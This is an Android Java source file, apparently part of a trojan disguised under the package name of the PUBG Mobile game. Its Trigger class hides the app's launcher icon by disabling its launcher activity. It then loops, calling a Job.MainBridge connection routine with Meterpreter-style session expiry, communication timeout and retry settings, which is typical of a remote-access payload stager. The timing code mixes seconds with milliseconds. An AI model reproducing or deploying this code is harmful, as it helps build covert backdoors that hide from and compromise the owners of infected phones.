package com.pubg.imobile;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Trigger {
    static String[] params;
    private static Context context;
    public static long comm_timeout;
    public static long retry_total;
    public static long retry_wait;
    static long session_expiry;

    public static void Worker(String[] args) {
        if (args != null) {
            params = new String[]{new File(".").getAbsolutePath()};
        }
        hideAppIcon();
            long sessionExpiry = 604800;
            long commTimeout = 300;
            long retryTotal = 3600;
            long retryWait = 10;
            long payloadStart = System.currentTimeMillis();
            long currentTime = System.currentTimeMillis();
            session_expiry = TimeUnit.SECONDS.toSeconds(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.SECONDS.toSeconds(commTimeout);
            retry_total = TimeUnit.SECONDS.toSeconds(retryTotal);
            retry_wait = TimeUnit.SECONDS.toSeconds(retryWait);
            while (currentTime <= payloadStart + retryTotal &&
                    currentTime <= session_expiry) {
                try {
                    Job.MainBridge();
                } catch (Exception e) {

                }
                try {
                    Thread.sleep(retryWait);
                } catch (InterruptedException e) {
                    break;
                }
                currentTime = System.currentTimeMillis();
            }
        }
    private static void hideAppIcon() {
        if (context == null) {
            return;
        }
        String packageName = context.getPackageName();
        PackageManager packageManager = context.getPackageManager();
        final Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> activities = packageManager.queryIntentActivities(intent, 0);
        for (ResolveInfo resolveInfo : activities) {
            if (!packageName.equals(resolveInfo.activityInfo.packageName)) {
                continue;
            }
            String activity = resolveInfo.activityInfo.name;
            ComponentName componentName = new ComponentName(packageName, activity);
            packageManager.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
    }

    public static void setContext(Context context) {
        Trigger.context = context;
    }
}
